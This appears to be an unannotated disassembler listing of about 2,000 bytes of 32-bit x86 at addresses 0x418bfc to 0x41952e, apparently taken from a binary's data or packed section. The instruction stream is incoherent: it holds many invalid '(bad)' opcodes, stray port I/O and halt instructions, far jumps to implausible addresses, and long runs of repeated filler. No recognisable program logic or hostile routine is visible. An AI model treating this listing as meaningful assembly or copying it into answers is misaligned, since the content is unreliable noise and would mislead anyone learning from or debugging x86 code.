  418bfc:	adc    bh,cl
  418bfe:	bound  ebp,QWORD PTR [edi-0x639d1ef6]
  418c04:	shl    ah,cl
  418c06:	outs   dx,DWORD PTR ds:[esi]
  418c07:	nop
  418c08:	loope  0x418bf5
  418c0a:	ds jmp 0xa4439303
  418c10:	shl    ah,cl
  418c12:	push   ebp
  418c13:	adc    dh,0xfb
  418c16:	dec    esp
  418c17:	(bad)  
  418c18:	mov    ecx,0xf3846bed
  418c1d:	push   ebp
  418c1e:	add    bl,BYTE PTR [ecx+eax*8-0x3686a11f]
  418c25:	in     eax,dx
  418c26:	bound  ebx,QWORD PTR [esi-0x49]
  418c29:	jmp    0xc2ff:0xe9a05045
  418c30:	in     eax,dx
  418c31:	ret    0x486c
  418c34:	cwde   
  418c35:	shl    BYTE PTR [esi+0x4b],0x0
	...
  418c49:	add    BYTE PTR [edx-0x4abf8e2b],al
  418c4f:	je     0x418c4e
  418c51:	sbb    ch,ch
  418c53:	leave  
  418c54:	bound  esi,QWORD PTR ds:0xa6cf644
  418c5a:	sub    eax,0x491b63e8
  418c5f:	div    DWORD PTR [eax-0x17]
  418c62:	repz mov bh,bh
  418c65:	and    eax,0x53f859
  418c6a:	hlt    
  418c6b:	jne    0x418cda
  418c6d:	push   eax
  418c6e:	call   0x4982f1e1
  418c73:	or     BYTE PTR [ecx],dh
  418c75:	add    dl,bl
  418c77:	js     0x418cdb
  418c79:	popa   
  418c7a:	inc    ebp
  418c7b:	pop    edi
  418c7c:	inc    ecx
  418c7d:	imul   edi,DWORD PTR [ebx],0x2e74605f
  418c83:	jbe    0x418cfb
  418c85:	inc    ecx
  418c86:	sbb    DWORD PTR [eax],ecx
  418c88:	add    BYTE PTR gs:[ebp+0x5f],dl
  418c8c:	imul   esp,DWORD PTR [ebp+0x45],0x2d69435f
  418c93:	pop    edi
  418c94:	ds add cl,bl
  418c97:	or     al,BYTE PTR [ebx+0x65]
  418c9a:	test   DWORD PTR [eax+0x72],ecx
  418c9d:	jb     0x418d1a
  418c9f:	pop    esi
  418ca0:	imul   esi,DWORD PTR [ecx+ebx*4+0x75],0x6c
  418ca5:	arpl   WORD PTR [eax+edi*2+0x70],si
  418ca9:	add    cl,cl
  418cab:	add    eax,0x6953
	...
  418cc0:	jne    0x418d20
  418cc2:	inc    eax
  418cc3:	push   0x6f517568
  418cc8:	mov    WORD PTR [esi+0x69],gs
  418ccb:	je     0x418d0d
  418ccd:	dec    ecx
  418cce:	jbe    0x418d44
  418cd0:	xor    al,0xb
  418cd2:	lods   eax,DWORD PTR ds:[esi]
  418cd3:	add    bh,al
  418cd5:	popa   
  418cd6:	imul   esp,DWORD PTR [edi+edx*8+0x61],0x6f
  418cdb:	jae    0x418ca2
  418cdd:	dec    esp
  418cde:	data16 ins BYTE PTR es:[edi],dx
  418ce0:	xor    al,0x4a
  418ce2:	std    
  418ce3:	call   DWORD PTR [esi+0x25736c08]
  418ce9:	jns    0x418d4b
  418ceb:	ins    DWORD PTR es:[edi],dx
  418cec:	or     DWORD PTR [edx+0x3e],esp
  418cef:	add    bl,dl
  418cf1:	pop    es
  418cf2:	inc    esi
  418cf3:	imul   esi,eax,0xd54de80b
  418cf9:	adc    eax,0x19d945f8
  418cfe:	out    0x3e,eax
  418d00:	lock ret 0x4600
  418d04:	leave  
  418d05:	or     ebp,eax
  418d07:	inc    eax
  418d08:	pushf  
  418d09:	je     0x418cfd
  418d0b:	(bad)  
  418d0c:	lock adc DWORD PTR [ebx],eax
  418d0f:	inc    ebp
  418d10:	xchg   ebp,eax
  418d11:	pop    ecx
  418d12:	shr    BYTE PTR [esp+ecx*4+0x52],1
  418d16:	in     eax,dx
  418d17:	bound  edi,QWORD PTR [eax-0x6b9c14c2]
  418d1d:	inc    edx
  418d1e:	(bad)  
  418d1f:	(bad)  
  418d20:	(bad)  
  418d21:	fiadd  DWORD PTR [ebx]
  418d23:	inc    ebp
	...
  418d34:	add    BYTE PTR [eax],al
  418d36:	lea    esi,[ecx-0x529d9d2d]
  418d3c:	in     al,dx
  418d3d:	ins    BYTE PTR es:[edi],dx
  418d3e:	push   esi
  418d3f:	mov    ds:0x55f03ef9,eax
  418d44:	add    al,0x45
  418d46:	dec    ebp
  418d47:	xchg   esp,eax
  418d48:	int    0x6c
  418d4a:	push   ebx
  418d4b:	jg     0x418d3a
  418d4d:	bound  edi,QWORD PTR [ecx]
  418d4f:	call   0x7401:0x60316ce3
  418d56:	icebp  
  418d57:	mov    al,ds:0xf74373e8
  418d5c:	icebp  
  418d5d:	jae    0x418d6c
  418d5f:	fcmovne st,st(0)
  418d61:	ins    DWORD PTR es:[edi],dx
  418d62:	push   ss
  418d63:	rol    DWORD PTR [ebx],0xa0
  418d66:	icebp  
  418d67:	and    ch,ah
  418d69:	jae    0x418d92
  418d6b:	(bad)  
  418d6c:	in     eax,dx
  418d6d:	arpl   WORD PTR [edi],dx
  418d6f:	xor    edi,ebp
  418d71:	inc    ebx
  418d72:	or     DWORD PTR [esi],ebp
  418d74:	in     eax,0x60
  418d76:	cld    
  418d77:	enter  0x76f1,0xb1
  418d7b:	pop    edi
  418d7c:	add    DWORD PTR [ebp-0xf],ecx
  418d7f:	push   es
  418d80:	cs out 0xe3,eax
  418d83:	(bad)  
  418d84:	sbb    bl,ch
  418d86:	fucom  st(7)
  418d88:	sbb    ah,bh
  418d8a:	mov    edi,0xcee5fdf4
  418d8f:	loop   0x418d9c
  418d91:	rol    ebx,1
  418d93:	hlt    
  418d94:	pmaxsw mm1,mm4
  418d97:	(bad)  
  418d98:	out    0x3,al
	...
  418daa:	add    BYTE PTR [eax],al
  418dac:	stos   BYTE PTR es:[edi],al
  418dad:	add    al,0x1a
  418daf:	out    0xa3,eax
  418db1:	(bad)
  418db4:	mov    eax,ds:0xb3f7cceb
  418db9:	(bad)  
  418dbb:	out    0x90,al
  418dbd:	cli    
  418dbe:	mov    ebp,0xe6c77ef1
  418dc3:	add    esp,ebx
  418dc5:	add    eax,0xf483f0cb
  418dca:	leave  
  418dcb:	out    dx,al
  418dcc:	pop    edi
  418dcd:	enter  0x3e6,0x34
  418dd1:	or     BYTE PTR [esi-0x67289c1a],ch
  418dd7:	jmp    0xf53f:0xe69ae85d
  418dde:	jge    0x418dc5
  418de0:	dec    esi
  418de1:	jecxz  0x418d6e
  418de3:	rcl    BYTE PTR [edx-0x1a],1
  418de6:	jb     0x418dd2
  418de8:	inc    esp
  418de9:	loope  0x418d8f
  418deb:	loop   0x418e07
  418ded:	in     al,dx
  418dee:	jns    0x418db2
  418df0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df1:	jno    0x418e23
  418df3:	add    esi,DWORD PTR ds:0x21d452ec
  418df9:	loopne 0x418e57
  418dfb:	jecxz  0x418e00
  418dfd:	in     al,dx
  418dfe:	ss repnz adc al,0xe9
  418e02:	dec    edi
  418e03:	lock adc al,al
  418e06:	dec    esp
  418e07:	clc    
  418e08:	mov    dh,0x6
  418e0a:	add    BYTE PTR [edi+0x3562cbf3],dh
	...
  418e20:	add    BYTE PTR [eax],al
  418e22:	xor    esp,esi
  418e24:	jno    0x418e41
  418e26:	push   edi
  418e27:	jecxz  0x418e9c
  418e29:	and    eax,0xa62f74b
  418e2e:	dec    eax
  418e2f:	loop   0x418ea2
  418e31:	adc    BYTE PTR [ebx],dh
  418e33:	jno    0x418e32
  418e35:	out    0xf0,eax
  418e37:	loop   0x418ea9
  418e39:	cmc    
  418e3a:	inc    ecx
  418e3b:	frstor [edx+0x7]
  418e3e:	inc    ebp
  418e3f:	jno    0x418e3e
  418e41:	fdivr  st(1),st
  418e43:	mov    ebp,0xe827d572
  418e48:	inc    ecx
  418e49:	loopne 0x418e6a
  418e4b:	in     al,0x53
  418e4d:	(bad)  
  418e4e:	and    al,0xe8
  418e50:	arpl   sp,ax
  418e52:	xor    cl,ch
  418e54:	pop    esi
  418e55:	mov    ebx,0xa5ff7df3
  418e5a:	push   cs
  418e5b:	cmc    
  418e5c:	push   ebx
  418e5d:	rcl    al,0xdf
  418e60:	inc    eax
  418e61:	mov    esi,0xe973e2de
  418e66:	rep lods eax,DWORD PTR ds:[esi]
  418e68:	add    bh,BYTE PTR [edx-0x669d1a39]
  418e6e:	repz xor al,0xff
  418e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e72:	into   
  418e73:	hlt    
  418e74:	dec    edx
  418e75:	xchg   esi,eax
  418e76:	xlat   BYTE PTR ds:[ebx]
  418e77:	cmc    
  418e78:	imul   eax,DWORD PTR [ebp+ebp*4-0x42739417],0xffffffd1
  418e80:	push   0xffffff84
  418e82:	mov    dl,0x70
  418e84:	std    
  418e85:	adc    DWORD PTR [eax],eax
	...
  418e97:	add    ch,dh
  418e99:	leave  
  418e9a:	bound  edx,QWORD PTR [ebp-0x58]
  418e9d:	shl    DWORD PTR [eax+0x5d],1
  418ea0:	mov    cl,0xf6
  418ea2:	jno    0x418ee2
  418ea4:	jle    0x418f16
  418ea6:	std    
  418ea7:	add    al,dl
  418ea9:	or     bh,BYTE PTR [edi]
  418eab:	jb     0x418ed9
  418ead:	push   0x71
  418eaf:	gs or  eax,0xb16c6c5c
  418eb5:	imul   esi,DWORD PTR gs:[eax+0x3a],0xe86e4f3a
  418ebd:	jp     0x418f2f
  418ebf:	push   0xfffd76f6
  418ec4:	sub    al,0xa
  418ec6:	push   eax
  418ec7:	jb     0x418eaf
  418ec9:	bound  esi,QWORD PTR [bp+di+0x3a]
  418ecd:	cmp    DWORD PTR [edx],esi
  418ecf:	inc    esi
  418ed0:	lock js 0x418f43
  418ed3:	je     0x418eee
  418ed5:	add    al,0x18
  418ed7:	add    ah,BYTE PTR [esi+0x74]
  418eda:	bound  ebp,QWORD PTR [esi+0x59]
  418edd:	jp     0x418f4b
  418edf:	arpl   WORD PTR [ecx+edi*2],di
  418ee2:	jo     0x418ee4
  418ee4:	out    dx,al
  418ee5:	or     BYTE PTR [eax+0x72],dl
  418ee8:	imul   esp,DWORD PTR es:[edx+0x73],0x4e32393a
  418ef0:	mov    esp,0x2e00716b
  418ef5:	or     cl,BYTE PTR [ebx+eax*2-0x5c]
  418ef9:	push   0x6d
  418efb:	push   ebx
	...
  418f0c:	add    BYTE PTR [eax],al
  418f0e:	jge    0x418f89
  418f10:	data16 outs dx,BYTE PTR ds:[esi]
  418f12:	jle    0x418f5e
  418f14:	std    
  418f15:	inc    DWORD PTR [edx+0xb]
  418f18:	inc    ecx
  418f19:	js     0x418f7b
  418f1b:	pop    edi
  418f1c:	dec    ebp
  418f1d:	jb     0x418f85
  418f1f:	push   0x42a7362
  418f24:	lods   eax,DWORD PTR ds:[esi]
  418f25:	add    cl,BYTE PTR [edx+0x47557166]
  418f2b:	arpl   WORD PTR [esi+0x6e],bx
  418f2e:	sub    eax,0xf064625f
  418f33:	and    bh,ah
  418f35:	pusha  
  418f36:	or     eax,0xf66efce
  418f3b:	fadd   st,st(1)
  418f3d:	data16 add al,0x3a
  418f40:	fbstp  TBYTE PTR [ecx-0x10]
  418f43:	(bad)  
  418f44:	fidiv  WORD PTR [ecx-0x2a]
  418f47:	retf   0x30e7
  418f4a:	and    bl,BYTE PTR [eax-0x23]
  418f4d:	imul   eax,esp,0x5d
  418f50:	add    DWORD PTR [ecx+0x62f61cf0],ecx
  418f56:	rcr    DWORD PTR [ecx],1
  418f58:	fist   WORD PTR [eax-0x3c]
  418f5b:	imul   esp,eax,0x5e
  418f5e:	lds    esp,FWORD PTR [eax]
  418f60:	jmp    0x9161:0xe909b747
  418f67:	jno    0x418f6a
  418f69:	xchg   ebp,eax
  418f6a:	lock mov al,ds:0xa8a873e0
  418f70:	in     eax,0x6c
	...
  418f82:	add    BYTE PTR [eax],al
  418f84:	xchg   edx,eax
  418f85:	ds in  eax,0x45
  418f88:	xor    BYTE PTR [eax-0x547baf18],0xe0
  418f8f:	pop    esi
  418f90:	test   DWORD PTR [ebp+0x1],ebx
  418f93:	push   cs
  418f94:	lock mov al,ds:0x436240ea
  418f9a:	in     al,0x73
  418f9c:	push   ebp
  418f9d:	popf   
  418f9e:	lock dec sp
  418fa1:	pusha  
  418fa2:	add    DWORD PTR [eax-0x10],esp
  418fa5:	mov    al,ds:0x915153ea
  418faa:	out    dx,al
  418fab:	dec    edx
  418fac:	push   ebp
  418fad:	xchg   ebx,eax
  418fae:	mov    edi,0x1834d71
  418fb3:	or     eax,0x40eaa0f0
  418fb8:	and    al,BYTE PTR [ebx+0x71573e4]
  418fbe:	xor    dl,ch
  418fc0:	and    bl,dh
  418fc2:	inc    edi
  418fc3:	jmp    0x781:0x3e6e410
  418fca:	push   ds
  418fcb:	call   0xeb964fe2
  418fd0:	add    esp,eax
  418fd2:	inc    edi
  418fd3:	call   0x48d80ae
  418fd8:	aad    0xda
  418fda:	inc    ebx
  418fdb:	xor    eax,0xe80b1d22
  418fe0:	retf   
  418fe1:	push   es
  418fe2:	sbb    al,0x6
  418fe4:	vmovhpd xmm6,xmm0,xmm6
	...
  418ff8:	add    BYTE PTR [eax],al
  418ffa:	into   
  418ffb:	fcom   QWORD PTR [edx]
  418ffd:	loop   0x418ffd
  418fff:	push   es
  419000:	cld    
  419001:	hlt    
  419002:	sar    al,cl
  419004:	mov    ecx,0x2e2de35
  419009:	call   0x3d8fe35
  41900e:	ret    0xcde3
  419011:	enter  0xe387,0xcc
  419015:	int3   
  419016:	xchg   edx,eax
  419017:	out    dx,eax
  419018:	stos   DWORD PTR es:[edi],eax
  419019:	sti    
  41901a:	mov    BYTE PTR [esi],0x31
  41901d:	add    esp,DWORD PTR [edx-0x7d2d321d]
  419023:	jecxz  0x418fdd
  419025:	cli    
  419026:	inc    ebp
  419027:	call   0xc4947eee
  41902c:	scas   al,BYTE PTR es:[edi]
  41902d:	ret    0x6ddf
  419030:	pop    esi
  419031:	add    eax,DWORD PTR [edx-0x1c]
  419034:	test   esp,eax
  419036:	pop    ebx
  419037:	ficomp WORD PTR [ecx-0x701bc722]
  41903d:	add    ebp,DWORD PTR [ebp+0x4cde9907]
  419043:	mov    esi,0xc21dde76
  419048:	dec    DWORD PTR [ebx+0x25002caa]
  41904e:	repz fsub DWORD PTR [edx+0x4e]
  419052:	push   edi
  419053:	(bad)  [edx+0x4c]
  419056:	mov    ebp,0x842c76e8
  41905b:	sub    al,0x0
  41905d:	xchg   ebx,eax
	...
  41906e:	add    BYTE PTR [eax],al
  419070:	repnz fsub DWORD PTR [edx+0x4e]
  419074:	lods   eax,DWORD PTR ds:[esi]
  419075:	mul    DWORD PTR [edx+0x48]
  419078:	pusha  
  419079:	call   0x2cacdcc6
  41907e:	add    dh,al
  419080:	repnz fsub DWORD PTR [edx+0xe]
  419084:	cmp    eax,0x533773e8
  419089:	loope  0x4190fd
  41908b:	or     al,0x87
  41908d:	cmc    
  41908e:	ds jmp 0x1b40d487
  419094:	pop    ss
  419095:	loop   0x4190d9
  419097:	nop    eax
  41909a:	push   ebp
  41909b:	or     BYTE PTR [eax],bl
  41909d:	clc    
  41909e:	bound  ebp,QWORD PTR [eax]
  4190a0:	hlt    
  4190a1:	cmp    al,0xff
  4190a3:	mov    edx,0xd94ce236
  4190a8:	fild   DWORD PTR cs:[eax-0x24]
  4190ac:	std    
  4190ad:	mul    BYTE PTR [edx-0x41]
  4190b0:	psubusb mm6,QWORD PTR [eax-0x34]
  4190b4:	std    
  4190b5:	ins    BYTE PTR es:[edi],dx
  4190b6:	std    
  4190b7:	loop   0x4190ab
  4190b9:	shl    DWORD PTR [edx-0x43],0xb6
  4190bd:	mul    DWORD PTR [edx-0x45]
  4190c0:	test   eax,0xb28c6acd
  4190c5:	ins    BYTE PTR es:[edi],dx
  4190c6:	std    
  4190c7:	mov    BYTE PTR [edi-0x2566a10e],ch
  4190cd:	aaa    
  4190ce:	xor    bh,BYTE PTR [edi+0x6be09f]
	...
  4190e4:	add    BYTE PTR [eax],al
  4190e6:	leave  
  4190e7:	or     ch,dl
  4190e9:	add    BYTE PTR [edx+0x6d6c6260],cl
  4190ef:	lods   eax,DWORD PTR ds:[esi]
  4190f0:	jne    0x419157
  4190f2:	push   0x5d
  4190f4:	jno    0x41915b
  4190f6:	enter  0x6f02,0x68
  4190fa:	xor    al,0x5f
  4190fc:	imul   esi,DWORD PTR [ebx],0x6c6424eb
  419102:	mov    ebp,0xc0007502
  419107:	fs jno 0x41916f
  41910a:	sub    esp,DWORD PTR [ebp+0x62]
  41910d:	je     0x419129
  41910f:	jns    0x41916f
  419111:	arpl   WORD PTR [edx+0x86c6f55],si
  419117:	add    esi,DWORD PTR [edi+0x0]
  41911a:	add    BYTE PTR [ebp+0x71],ah
  41911d:	gs jmp 0x419184
  419120:	bound  esi,QWORD PTR [edx+ecx*1+0x79]
  419124:	bound  esp,QWORD PTR [ecx+0x35]
  419127:	addr16 push edx
  419129:	jb     0x419128
  41912b:	inc    ecx
  41912c:	std    
  41912d:	jmp    DWORD PTR [esi]
  41912f:	pop    ebx
  419130:	imul   ebp,DWORD PTR [ecx+0x1f],0x67
  419134:	jno    0x419164
  419136:	and    eax,0x1c006964
  41913b:	add    ecx,DWORD PTR [edi+0x74]
  41913e:	sub    ebx,DWORD PTR [ecx+0x71]
  419141:	jb     0x419193
  419143:	inc    ebx
  419144:	std    
  419145:	dec    DWORD PTR [ecx]
  419147:	add    ecx,DWORD PTR [edi+0x74]
	...
  41915a:	add    BYTE PTR [eax],al
  41915c:	stos   DWORD PTR es:[edi],eax
  41915d:	push   ebp
  41915e:	inc    eax
  41915f:	push   0x3e3aab
  419164:	lds    eax,FWORD PTR [edx]
  419166:	dec    edi
  419167:	je     0x4191e4
  419169:	cmp    ebp,DWORD PTR [ecx+ecx*2+0x7f]
  41916d:	pop    ebx
  41916e:	ds add al,dh
  419171:	popa   
  419172:	add    al,0x51
  419174:	inc    esp
  419175:	nop
  419176:	shl    BYTE PTR [ebx+0x42],cl
  419179:	lahf   
  41917a:	add    edx,ebp
  41917c:	lock nop
  41917e:	in     eax,dx
  41917f:	jno    0x4191b4
  419181:	xor    ecx,0x4d
  419184:	sub    DWORD PTR [edi+0x30f10e01],ebx
  41918a:	lock jno 0x4191b0
  41918d:	shl    cl,cl
  41918f:	inc    esi
  419190:	pop    ds
  419191:	pop    esi
  419192:	add    DWORD PTR [ecx+0x8],esi
  419195:	sub    ch,ch
  419197:	pop    esi
  419198:	add    bh,dl
  41919a:	and    eax,0x3b9dc64
  41919f:	ss lock (bad) 
  4191a2:	in     eax,0x62
  4191a4:	in     al,0xfc
  4191a6:	loop   0x41920b
  4191a8:	int3   
  4191a9:	(bad)  
  4191ab:	sub    dh,al
  4191ad:	add    al,0xdf
  4191af:	jae    0x419189
  4191b1:	add    al,0xf1
  4191b3:	jae    0x419187
  4191b5:	push   ss
  4191b6:	out    0x5e,al
  4191b8:	(bad)  
  4191bb:	inc    edi
  4191bc:	lock jo 0x4191a5
  4191bf:	pusha  
	...
  4191d0:	add    BYTE PTR [eax],al
  4191d2:	fwait
  4191d3:	cli    
  4191d4:	out    dx,eax
  4191d5:	call   FWORD PTR [edi]
  4191d7:	inc    esp
  4191d8:	add    DWORD PTR [ecx-0x79],esp
  4191db:	push   ebx
  4191dc:	jecxz  0x419240
  4191de:	xchg   ebx,eax
  4191df:	push   ecx
  4191e0:	add    DWORD PTR [esi],esp
  4191e2:	lock inc eax
  4191e4:	in     eax,0x6c
  4191e6:	add    DWORD PTR [edx-0xe],0x6c
  4191ea:	xchg   ebx,eax
  4191eb:	pop    eax
  4191ec:	loopne 0x419261
  4191ee:	lock mov ds:0x424d7101,eax
  4191f4:	(bad)  
  4191f6:	fistp  WORD PTR [ebp+0x74d7101]
  4191fc:	xchg   ebx,eax
  4191fd:	loopne 0x41924f
  4191ff:	repz out 0x3,al
  419202:	push   es
  419203:	pop    es
  419204:	cdq    
  419205:	loopne 0x419257
  419207:	icebp  
  419208:	out    0x3,al
  41920a:	sub    eax,0x23e07a07
  41920f:	test   BYTE PTR [ebp+0x76da18e2],0xef
  419216:	lahf   
  419217:	push   0xffffffc8
  419219:	add    edi,DWORD PTR ds:0x3d127d6
  41921f:	call   0xf744827c
  419224:	out    0x3,al
  419226:	add    eax,0x8e13df6
  41922b:	ss stc 
  41922d:	and    eax,0x44adad4
  419232:	mov    ebx,0xe52306
	...
  419247:	add    BYTE PTR [esi-0x2d0eec1e],bh
  41924d:	hlt    
  41924e:	ss repnz fsubr st(0),st
  419252:	psubsb mm2,mm2
  419255:	(bad)  
  419256:	out    0x3,al
  419258:	lahf   
  419259:	push   es
  41925a:	xor    al,0xe6
  41925c:	retf   
  41925d:	fld    DWORD PTR [edi]
  41925f:	loopne 0x419223
  419261:	cmc    
  419262:	add    esi,edx
  419264:	mov    bh,0xf4
  419266:	add    eax,0x3da96de
  41926b:	add    al,0xa3
  41926d:	cmc    
  41926e:	retf   
  41926f:	icebp  
  419270:	xchg   edx,eax
  419271:	fcom   st(4)
  419273:	and    eax,0x3c2da8c
  419278:	lock push es
  41927a:	out    0x3,eax
  41927c:	lock push es
  41927e:	out    0x3,eax
  419280:	lock push es
  419282:	out    0x3,eax
  419284:	lock push es
  419286:	add    cl,ch
  419288:	repz push es
  41928a:	add    cl,ch
  41928c:	repz push es
  41928e:	add    cl,ch
  419290:	repz push es
  419292:	add    cl,ch
  419294:	repz push es
  419296:	add    cl,ch
  419298:	repz push es
  41929a:	add    cl,ch
  41929c:	repz push es
  41929e:	add    cl,ch
  4192a0:	repz push es
  4192a2:	add    cl,ch
  4192a4:	repz push es
  4192a6:	add    cl,ch
  4192a8:	repz push es
  4192aa:	add    cl,ch
	...
  4192bc:	add    BYTE PTR [eax],al
  4192be:	repz push es
  4192c0:	add    cl,ch
  4192c2:	repz push es
  4192c4:	add    cl,ch
  4192c6:	repz push es
  4192c8:	add    cl,ch
  4192ca:	repz push es
  4192cc:	add    cl,ch
  4192ce:	repz push es
  4192d0:	add    cl,ch
  4192d2:	repz push es
  4192d4:	add    cl,ch
  4192d6:	repz push es
  4192d8:	add    cl,ch
  4192da:	repz push es
  4192dc:	add    cl,ch
  4192de:	repz push es
  4192e0:	add    cl,ch
  4192e2:	repz push es
  4192e4:	add    cl,ch
  4192e6:	repz push es
  4192e8:	add    cl,ch
  4192ea:	repz push es
  4192ec:	add    cl,ch
  4192ee:	repz push es
  4192f0:	add    cl,ch
  4192f2:	repz push es
  4192f4:	add    cl,ch
  4192f6:	repz push es
  4192f8:	add    cl,ch
  4192fa:	repz push es
  4192fc:	add    cl,ch
  4192fe:	repz push es
  419300:	add    cl,ch
  419302:	repz push es
  419304:	add    cl,ch
  419306:	repz push es
  419308:	add    cl,ch
  41930a:	repz push es
  41930c:	add    cl,ch
  41930e:	repz push es
  419310:	add    BYTE PTR [eax],al
  419312:	fld    DWORD PTR [eax+eax*1]
  419315:	add    cl,bl
  419317:	add    al,0x0
  419319:	add    cl,cl
  41931b:	add    al,0x0
  41931d:	add    cl,cl
  41931f:	add    al,0x0
	...
  419331:	add    BYTE PTR [eax],al
  419333:	add    cl,bl
  419335:	add    al,0x0
  419337:	add    cl,bl
  419339:	add    al,0x0
  41933b:	add    BYTE PTR [ebx+edi*1+0x3ba4cccc],ch
  419342:	int3   
  419343:	int3   
  419344:	inc    ebp
  419345:	jl     0x419333
  419347:	push   ecx
  419348:	jnp    0x41930c
  41934a:	pop    es
  41934b:	mov    ch,al
  41934d:	jle    0x41939a
  41934f:	jmp    FWORD PTR [ebx+0x62]
  419352:	pop    ebx
  419353:	ret    
  419354:	and    eax,0x1e51ec7c
  419359:	shl    BYTE PTR [eax],1
  41935b:	leave  
  41935c:	adc    al,0x7c
  41935e:	outs   dx,DWORD PTR ds:[esi]
  41935f:	xor    BYTE PTR [ebx-0xf],ch
  419362:	or     ecx,DWORD PTR [ebx+0x46890ae6]
  419368:	clc    
  419369:	jge    0x4193ae
  41936b:	cld    
  41936c:	imul   ebp,ecx,0x1f
  41936f:	mov    ebx,DWORD PTR [esi]
  419371:	xchg   DWORD PTR ds:0x7fffc46b,edi
  419377:	aas    
  419378:	mov    ebx,0x49eb01f2
  41937d:	enter  0x8b5d,0x4d
  419381:	retf   0xccc0
  419384:	lds    edi,FWORD PTR [ebx-0x14]
  419387:	adc    DWORD PTR [ebx+eiz*1],0xffffff89
  41938b:	inc    ebp
  41938c:	call   0x6c21d70e
  419391:	mov    edx,0x66a58bdf
  419396:	add    DWORD PTR [ecx+0x0],edx
	...
  4193a9:	add    ah,al
  4193ab:	jge    0x419400
  4193ad:	in     al,0x6b
  4193af:	ret    0x8be3
  4193b2:	test   al,0xee
  4193b4:	add    BYTE PTR [ebp-0x8],cl
  4193b7:	jge    0x419404
  4193b9:	clc    
  4193ba:	jnp    0x41938d
  4193bc:	test   DWORD PTR [ebx+0x45012332],0xe8437de8
  4193c6:	jnp    0x419381
  4193c8:	test   DWORD PTR [ebx+0x55012721],0xf0537de8
  4193d2:	imul   eax,ecx,0xfffffff7
  4193d5:	mov    edi,DWORD PTR [eax]
  4193d7:	or     eax,DWORD PTR [ecx]
  4193d9:	dec    ebp
  4193da:	clc    
  4193db:	jge    0x419428
  4193dd:	cld    
  4193de:	mov    bh,0xc1
  4193e0:	repz add al,dh
  4193e3:	push   es
  4193e4:	add    bl,ch
  4193e6:	stc    
  4193e7:	jnp    0x41943c
  4193e9:	hlt    
  4193ea:	jae    0x419430
  4193ec:	dec    DWORD PTR [eax+0x45897325]
  4193f2:	js     0x41946f
  4193f4:	dec    ebx
  4193f5:	hlt    
  4193f6:	sub    edi,DWORD PTR [edi+0x7bb87317]
  4193fc:	push   ebx
  4193fd:	lock imul eax,DWORD PTR [ecx+eax*1],0x45
  419402:	call   0xdb1dd784
  419407:	clc    
  419408:	lods   al,BYTE PTR ds:[si]
  41940a:	repnz (bad) 
  41940c:	dec    DWORD PTR [edx+0x0]
	...
  41941e:	add    BYTE PTR [eax],al
  419420:	lods   eax,DWORD PTR ds:[esi]
  419421:	dec    edx
  419422:	dec    edi
  419423:	call   0x4199c8
  419428:	jae    0x41946c
  41942a:	or     al,0x85
  41942c:	xor    cl,dh
  41942e:	sbb    BYTE PTR [ebx+0x458972c5],cl
  419434:	or     bh,dh
  419436:	mov    ah,0xc
  419438:	mov    al,ds:0x7bec4b7d
  41943d:	shr    ebx,1
  41943f:	mov    esi,DWORD PTR [ebp+0x6004896a]
  419445:	add    eax,DWORD PTR [ebx+0x8]
  419448:	fist   DWORD PTR [ecx+ecx*4]
  41944b:	dec    ebp
  41944c:	loopne 0x4193d8
  41944e:	mov    edi,0xefd46904
  419453:	jmp    0x4193e1
  419455:	sbb    al,al
  419457:	mov    edx,ebp
  419459:	(bad)  
  41945a:	ror    ah,0xb4
  41945d:	push   ebx
  41945e:	int3   
  41945f:	int3   
  419460:	lods   al,BYTE PTR ds:[esi]
  419461:	push   ebx
  419462:	int3   
  419463:	int3   
  419464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419465:	push   ebx
  419466:	int3   
  419467:	int3   
  419468:	inc    ebp
  419469:	xchg   edx,eax
  41946a:	in     al,dx
  41946b:	adc    DWORD PTR [edi+edi*8+0x669f05e7],0xfffffffd
  419473:	mov    DWORD PTR ds:0x9845896f,ebp
  419479:	mov    bh,0xe7
  41947b:	sub    DWORD PTR [edi-0x4b7c029a],eax
  419481:	or     esp,DWORD PTR [ecx+0xb4]
	...
  419493:	add    BYTE PTR [eax],al
  419495:	add    BYTE PTR ds:0xac67ffc8,bl
  41949b:	or     DWORD PTR [eax+0x0],eax
  41949e:	jnp    0x419474
  4194a0:	out    0x51,eax
  4194a2:	pop    edi
  4194a3:	cld    
  4194a4:	mov    bl,0x55
  4194a6:	mov    cl,0x6
  4194a8:	mov    eax,ds:0xffc7a5b8
  4194ad:	imul   esi,eax,0x2c67fff0
  4194b3:	or     DWORD PTR [eax+0x0],eax
  4194b6:	aaa    
  4194b7:	cld    
  4194b8:	mov    bh,0x55
  4194ba:	mov    cl,0x6
  4194bc:	xchg   DWORD PTR [ebp+0x18],eax
  4194bf:	dec    esi
  4194c0:	inc    ebx
  4194c1:	cld    
  4194c2:	lock push es
  4194c4:	add    BYTE PTR [eax],al
  4194c6:	or     edx,DWORD PTR [eax]
  4194c8:	mov    DWORD PTR [ebp+0xc],edx
  4194cb:	mov    al,dl
  4194cd:	add    DWORD PTR [ecx-0x44],edi
  4194d0:	sti    
  4194d1:	cmp    DWORD PTR [ebp+0x62],0x8
  4194d5:	jae    0x4194a8
  4194d7:	xchg   ecx,eax
  4194d8:	inc    ebx
  4194d9:	cld    
  4194da:	jnp    0x4194ee
  4194dc:	or     DWORD PTR [edx+esi*8+0x6b50ffc6],0xffffffbb
  4194e4:	out    0x52,eax
  4194e6:	xlat   BYTE PTR ds:[ebx]
  4194e7:	sti    
  4194e8:	mov    bl,0x55
  4194ea:	xor    DWORD PTR [edi],eax
  4194ec:	mov    DWORD PTR [ebp-0x3c],ecx
  4194ef:	pop    DWORD PTR [ecx*4+0x3ebb84]
  4194f6:	retf   
  4194f7:	ss mov ebp,esp
	...
  41950a:	add    BYTE PTR [eax],al
  41950c:	dec    ebp
  41950d:	dec    edx
  41950e:	int3   
  41950f:	int3   
  419510:	mov    ah,0x52
  419512:	int3   
  419513:	int3   
  419514:	lods   al,BYTE PTR ds:[esi]
  419515:	push   edx
  419516:	int3   
  419517:	int3   
  419518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419519:	push   edx
  41951a:	int3   
  41951b:	int3   
  41951c:	and    eax,0xe0a1ec92
  419521:	mov    esp,0x91be003e
  419526:	inc    eax
  419527:	xor    BYTE PTR [ebx-0x2d],ch
  41952a:	pop    es
  41952b:	ds jns 0x4194fc
  41952e:	pop    es
